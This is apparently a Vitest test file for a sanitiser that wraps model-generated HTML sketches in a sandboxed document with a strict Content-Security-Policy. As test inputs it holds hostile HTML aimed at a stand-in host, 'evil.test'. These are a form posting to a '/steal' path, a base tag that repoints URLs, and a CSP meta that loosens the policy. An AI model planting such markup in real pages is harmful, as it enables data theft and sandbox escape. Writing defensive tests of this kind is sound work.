import { describe, expect, it } from 'vitest'

import {
  buildSketchDocument,
  MAX_SKETCH_HTML_BYTES,
  SKETCH_CSP,
  SKETCH_SANDBOX
} from './sketch-document'

describe('buildSketchDocument', () => {
  it('injects the CSP meta as the first element in head', () => {
    const { html } = buildSketchDocument('<p>hi</p>')
    expect(html).toContain(`content="${SKETCH_CSP}"`)
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<body>'))
    expect(html.indexOf('<head>') + '<head>'.length).toBe(html.indexOf('<meta http-equiv'))
  })

  it('blocks remote loads and network egress in the CSP', () => {
    expect(SKETCH_CSP).toContain("default-src 'none'")
    expect(SKETCH_CSP).toContain("connect-src 'none'")
    expect(SKETCH_CSP).toContain('img-src data:')
    expect(SKETCH_CSP).toContain("object-src 'none'")
    expect(SKETCH_CSP).toContain("frame-src 'none'")
    // Nothing may whitelist a remote scheme or a wildcard host.
    expect(SKETCH_CSP).not.toMatch(/https?:/)
    expect(SKETCH_CSP).not.toContain('*')
  })

  it('allows inline script and style only (the feature requires it)', () => {
    expect(SKETCH_CSP).toContain("script-src 'unsafe-inline'")
    expect(SKETCH_CSP).toContain("style-src 'unsafe-inline'")
    expect(SKETCH_CSP).not.toContain("script-src 'unsafe-inline' http")
  })

  it('never grants same-origin', () => {
    expect(SKETCH_SANDBOX).toBe('allow-scripts')
    expect(SKETCH_SANDBOX).not.toContain('allow-same-origin')
  })

  it('preserves the model script so canvas/three.js work still runs', () => {
    const { html } = buildSketchDocument(
      '<canvas id="c"></canvas><script>document.getElementById("c").width=10</script>'
    )

    expect(html).toContain('<canvas id="c"></canvas>')
    expect(html).toContain('document.getElementById("c").width=10')
  })

  it('strips <base> tags that would repoint relative URLs', () => {
    const { html } = buildSketchDocument('<base href="https://evil.test/"><p>x</p>')
    expect(html).not.toMatch(/<base\b/i)
    expect(html).not.toContain('evil.test')
    expect(html).toContain('<p>x</p>')
  })

  it('strips a model-authored CSP meta that could loosen ours', () => {
    const { html } = buildSketchDocument(
      '<meta http-equiv="Content-Security-Policy" content="default-src *"><p>x</p>'
    )

    expect(html).not.toContain('default-src *')
    expect((html.match(/Content-Security-Policy/g) ?? []).length).toBe(1)
  })

  it('rewrites top/parent navigation targets', () => {
    const { html } = buildSketchDocument(
      '<a href="https://evil.test" target="_top">a</a><a href="#" target=_parent>b</a>'
    )

    expect(html).not.toMatch(/target\s*=\s*"?_top/i)
    expect(html).not.toMatch(/target\s*=\s*"?_parent/i)
    expect(html).toContain('target="_blank"')
  })

  it('neutralises form submission', () => {
    const { html } = buildSketchDocument(
      '<form action="https://evil.test/steal" method="post" target="_top"><input name="a"></form>'
    )

    expect(html).not.toContain('evil.test')
    expect(html).not.toMatch(/action\s*=/i)
    expect(html).toContain('onsubmit="return false"')
    expect(SKETCH_CSP).toContain("form-action 'none'")
  })

  it('drops the model doctype and emits exactly one document wrapper', () => {
    const { html } = buildSketchDocument('<!doctype html><html><body><p>x</p></body></html>')
    expect(html.startsWith('<!doctype html><html><head>')).toBe(true)
    expect((html.match(/<!doctype/gi) ?? []).length).toBe(1)
  })

  it('truncates oversized payloads and reports it', () => {
    const big = 'a'.repeat(MAX_SKETCH_HTML_BYTES + 500)
    const result = buildSketchDocument(big)
    expect(result.truncated).toBe(true)
    expect(result.html.length).toBeLessThan(big.length + 1000)
  })

  it('does not flag normal payloads as truncated', () => {
    expect(buildSketchDocument('<p>x</p>').truncated).toBe(false)
  })

  it('tolerates non-string input', () => {
    for (const value of [null, undefined, 42, {}, []]) {
      const { html } = buildSketchDocument(value)
      expect(html).toContain('Content-Security-Policy')
    }
  })
})
